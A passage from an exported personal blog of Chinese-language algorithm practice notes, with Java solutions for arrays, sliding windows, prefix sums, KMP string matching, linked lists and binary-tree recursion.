<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] countBits(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[] bits = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="comment">//i &amp; (i - 1):其结果是将最低位的1变为0</span></span><br><span class="line">            bits[i] = bits[i &amp; (i - <span class="number">1</span>)] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组进行反转或者是字符串进行反转：<strong>先整体反转再局部反转</strong></p>
<p><strong>其实很多数组填充类的问题，都可以先预先给数组扩容带填充后的大小，然后在从后向前进行操作。</strong></p>
<h2 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] numbers, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="type">int</span>[] result = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">endJ</span> <span class="operator">=</span> numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span><span class="number">0</span>,right = numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(numbers[left]+numbers[right]==target)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;left,right&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(numbers[left]+numbers[right]&gt;target)&#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>

<p>三数之和</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (right &gt; left) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i], nums[left], nums[right]));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) right--;</span><br><span class="line">                    <span class="keyword">while</span> (right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) left++;</span><br><span class="line">                    </span><br><span class="line">                    right--; </span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (end &lt; n) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">                ans = Math.min(ans, end - start + <span class="number">1</span>);</span><br><span class="line">                sum -= nums[start];</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">return</span> <span class="variable">ans</span> <span class="operator">=</span>= Integer.MAX_VALUE ? <span class="number">0</span> : ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最长不重复字串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> s string字符串 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span> <span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="comment">//使用双指针来进行相关操作</span></span><br><span class="line">        <span class="keyword">if</span>(s.length()==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; hashset = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> result=<span class="number">1</span>,temp = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        hashset.put(s.charAt(<span class="number">0</span>),<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!hashset.containsKey(s.charAt(i)))&#123;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//找到重复的字符的位置</span></span><br><span class="line">                <span class="comment">//删除从前到重复字符串的所有字符</span></span><br><span class="line"><span class="comment">//                 left = hashset.get(s.charAt(i))+1;</span></span><br><span class="line">                left = Math.max(hashset.get(s.charAt(i))+<span class="number">1</span>,left);</span><br><span class="line">            &#125;</span><br><span class="line">            result = Math.max(i-left+<span class="number">1</span>,result);</span><br><span class="line">            hashset.put(s.charAt(i),i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前缀和：一般需要和hashmap进行组合，注意键值对分别代表甚意思。</p>
<p>统计最长的相同0，1，的子数组的大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前缀和，最长的长度</span></span><br><span class="line">        HashMap&lt;Integer,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果nums[i]=0，将其转换为-1，</span></span><br><span class="line">        <span class="comment">//所以就可以将整个问题直接转换成，前缀和为0的最长连续子数组的大小。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        hashmap.put(<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="comment">//只需要在遍历的时候遇到0就-1即可。不需要单独遍历整个数组</span></span><br><span class="line">            preSum = nums[i]==<span class="number">0</span>?preSum-<span class="number">1</span>:preSum+<span class="number">1</span>;            </span><br><span class="line">            <span class="keyword">if</span>(hashmap.containsKey(preSum))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> hashmap.get(preSum);</span><br><span class="line">                ans = Math.max(ans,i-index);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//因为需要的是最长的子数组，所以并不需要覆盖，</span></span><br><span class="line">                hashmap.put(preSum,i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="KMP（字符串匹配）"><a href="#KMP（字符串匹配）" class="headerlink" title="KMP（字符串匹配）"></a>KMP（字符串匹配）</h1><p><strong>强烈建议大家把next数组打印出来，看看next数组里的规律，有助于理解KMP算法</strong></p>
<p><font color = red>字符串匹配要优先想到KMP算法</font></p>
<p>思想：当字符串出现不匹配的时候，可以根据已经匹配的内容来进行下一次匹配位置的计算。找到最长相等前后缀之后匹配失败的位置就是后缀子串的后面</p>
<blockquote>
<ul>
<li><p><strong>前缀是指不包含最后一个字符的所有以第一个字符开头的连续子串</strong></p>
</li>
<li><p><strong>后缀是指不包含第一个字符的所有以最后一个字符结尾的连续子串</strong>。</p>
</li>
<li><p>next数组（前缀表）：它记录了模式串与主串(文本串)不匹配的时候，模式串应该从哪里开始重新匹配。<strong>记录下标i之前（包括i）的字符串中，有多大长度的相同<u>前缀后缀</u>。</strong></p>
</li>
<li><p>next数组实现的时候通常是将整个数组值-1（计算出了整个模式的最长匹配表之后，将其向右移动一个位置）.</p>
</li>
</ul>
</blockquote>
<p><u>目标串永不回退，就只是需要移动模式串的起始位置。</u> 移动的位置是 j &#x3D; next[j] next[0]&#x3D;-1的时候</p>
<p>aabaa的最长相等前后缀是2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">strStr</span><span class="params">(String haystack, String needle)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[]next = getNext(needle);</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;haystack.length();i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span>&amp;&amp;haystack.charAt(i)!=needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="comment">//模式子串进行回退</span></span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(haystack.charAt(i)==needle.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == next.length-<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> i-j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] getNext(String s)&#123;</span><br><span class="line">        <span class="type">int</span> j=-<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> [] next = <span class="keyword">new</span> <span class="title class_">int</span>[s.length()];</span><br><span class="line">        next[<span class="number">0</span>] = j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="comment">//进行回退</span></span><br><span class="line">            <span class="keyword">while</span>(j&gt;=<span class="number">0</span> &amp;&amp; s.charAt(i)!=s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j = next[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i)==s.charAt(j+<span class="number">1</span>))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            next[i] = j;</span><br><span class="line">            System.out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">binaryTreePaths</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; paths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        getBinaryTreePaths(root,paths);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getBinaryTreePaths</span><span class="params">(TreeNode root, List&lt;Integer&gt; paths)</span>&#123;</span><br><span class="line">        paths.add(root.val) ;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;paths.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                temp.append(String.valueOf(paths.get(i)) +<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            temp.append(paths.get(paths.size()-<span class="number">1</span>)) ;</span><br><span class="line">            result.add(temp.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            getBinaryTreePaths(root.left,paths);</span><br><span class="line">            <span class="comment">//每一次递归之后都需要回溯一下</span></span><br><span class="line">            paths.remove(paths.size()-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            getBinaryTreePaths(root.right,paths);</span><br><span class="line">            paths.remove(paths.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>notes</category>
        <category>刷题</category>
      </categories>
      <tags>
        <tag>刷题</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题-算法篇</title>
    <url>/2022/03/18/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写代码：<font color=red>先在草稿上面分清楚类别</font>，分析好了各个情况才开始敲代码，不然一直调试会很不方便，效率较低。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.parseInt(string) ;<span class="comment">//可以将string直接转换成int(按照十进制)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> String.valueOf(<span class="type">int</span>) ;<span class="comment">//可以将int直接转换成字符串 比如 1 = &quot;1&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>很多数组填充类的问题，都可以先预先给数组扩容带填充后的大小，然后在从后向前进行操作。</p>
</li>
<li><p>如果需要判断某个数据是否再一个数据结构中是否存在，则一般建议可以用哈希表</p>
</li>
<li><p>哈希表和数组再同等情况下建议用数组（时间更快）</p>
</li>
<li><p><strong>如果需要遍历整棵树，递归函数就不能有返回值。如果需要遍历某一条固定路线，递归函数就一定要有返回值！</strong></p>
</li>
</ul>
<span id="more"></span>


<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>头插法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> ReverseList(head.next);</span><br><span class="line">    <span class="comment">//走到了尾节点</span></span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环</span></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> <span class="literal">null</span>,next;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">            next = head.next;</span><br><span class="line">            head.next = p;</span><br><span class="line">            p = head;</span><br><span class="line">            head = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>找到循环链表的入口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两个指针，一个指针一次走两步，一个指针一次走一步，第一次相遇是结束循环</span></span><br><span class="line"><span class="comment">//第二次循环时，快指针从头开始，两个指针以相同的速度来移动，则这一次相遇的时候就是链表循环的部分的入口</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">EntryNodeOfLoop</span><span class="params">(ListNode pHead)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> pHead,slow = pHead;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        <span class="keyword">if</span>(fast == slow)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fast==<span class="literal">null</span> || fast.next==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fast = pHead;</span><br><span class="line">    <span class="keyword">while</span>(fast!=slow)&#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复杂链表的深度拷贝：该链表包括一个随机指针，和一个next指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> RandomListNode <span class="title function_">Clone</span><span class="params">(RandomListNode pHead)</span> &#123;</span><br><span class="line">    <span class="type">RandomListNode</span> <span class="variable">pre</span> <span class="operator">=</span> pHead,l1 = pHead,next,p;</span><br><span class="line">    RandomListNode l2 ;</span><br><span class="line">    <span class="comment">//将所有的节点复制到本节点的下一个节点</span></span><br><span class="line">    <span class="keyword">while</span>(pHead!=<span class="literal">null</span> &amp;&amp; pre!=<span class="literal">null</span>)&#123;</span><br><span class="line">        next = pHead.next;</span><br><span class="line">        <span class="type">RandomListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomListNode</span>(pHead.label);</span><br><span class="line">        pre.next = temp;</span><br><span class="line">        pre.next.next = next;</span><br><span class="line">        pre = next;</span><br><span class="line">        pHead = next;</span><br><span class="line">    &#125;</span><br><span class="line">    pre = l1;</span><br><span class="line">    l2 = pre.next;</span><br><span class="line">    p = l2;</span><br><span class="line">    <span class="comment">//处理随机指针，复制之后的节点的随机指针指向，原来节点的随机指针的下一个节点</span></span><br><span class="line">    <span class="keyword">while</span>(pre!=<span class="literal">null</span> &amp;&amp; p!=<span class="literal">null</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.random!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p.random = pre.random.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p = p.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre = pre.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = l2;</span><br><span class="line">    pre = l1;</span><br><span class="line">    <span class="comment">//将两个链表分开</span></span><br><span class="line">    <span class="keyword">while</span>(pre!=<span class="literal">null</span>&amp;&amp;p!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p.next = p.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre.next = pre.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p.next;</span><br><span class="line">        pre = pre.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><blockquote>
<p>树的遍历方式：深度优先遍历、广度优先遍历（层次遍历）</p>
<p>递归和回溯是永远 在一起的，右一个递归就要有一个回溯</p>
</blockquote>
<p><font color=blue><strong>在使用递归的时候一定要右一个大局观，就是这个函数的目的是什么</strong></font>，因为很多时候都需要用到这个，需要处理返回值，比如 <code>root.left =  digui(root,left ...)</code>.</p>
<blockquote>
<ul>
<li>二叉树节点的深度：指从根节点到该节点的最长简单路径边的条数。  根节点的最小</li>
<li>二叉树节点的高度：指从该节点到叶子节点的最长简单路径边的条数   根节点最大</li>
</ul>
<p>因为求深度可以从上到下去查 所以需要<u>前序遍历（中左右）</u>，而高度只能从下到上去查，所以只能<u>后序遍历（左右中）</u></p>
</blockquote>
<p><u>递归函数注意事项：</u></p>
<ol>
<li><strong>确定递归函数的参数和返回值：</strong> 确定哪些参数是递归的过程中需要处理的，那么就在递归函数里加上这个参数， 并且还要明确每次递归的返回值是什么进而确定递归函数的返回类型。</li>
<li><strong>确定终止条件：</strong> 写完了递归算法, 运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</li>
<li><strong>确定单层递归的逻辑：</strong> 确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。</li>
</ol>
<p>在一般情况下，通常考虑的不是整体的框架改变，还是改变其他的数据，比如，以之字形来遍历二叉树，二叉树的层次遍历的整体框架不变，边的只是每层访问结束之后，array这个临时变量是如何改变的。比如是否需要反转等。<code>格局打开</code></p>
<h2 id="在递归中使用栈："><a href="#在递归中使用栈：" class="headerlink" title="在递归中使用栈："></a>在递归中使用栈：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    Stack&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; <span class="title function_">FindPath</span><span class="params">(TreeNode root,<span class="type">int</span> expectNumber)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        path.push(root.val);</span><br><span class="line">        <span class="keyword">if</span>(root.val==expectNumber &amp;&amp;root.left==<span class="literal">null</span>&amp;&amp;root.right==<span class="literal">null</span>)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line">        FindPath(root.left,expectNumber-root.val);</span><br><span class="line">        FindPath(root.right,expectNumber-root.val);</span><br><span class="line">        path.pop();</span><br><span 